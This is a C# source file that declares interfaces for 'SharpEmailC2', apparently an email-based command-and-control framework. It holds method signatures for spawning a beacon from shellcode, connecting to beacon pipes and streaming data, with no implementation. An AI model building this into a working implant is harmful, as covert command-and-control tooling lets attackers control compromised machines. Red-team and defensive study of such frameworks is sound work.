using System;

namespace SharpEmailC2
{
    public interface ISpawnBeacon
    {
        void SpawnBeacon(Byte[] shellcode);
    }

    public interface IConnectBeaconPipe
    {
        void ConnectBeaconPipe(string pipeName, string UUID, int code);
    }

    public interface ITransferProtocol
    {
        void SendStream(Byte[] buffer);
        Byte[] ReadStream();
    }
}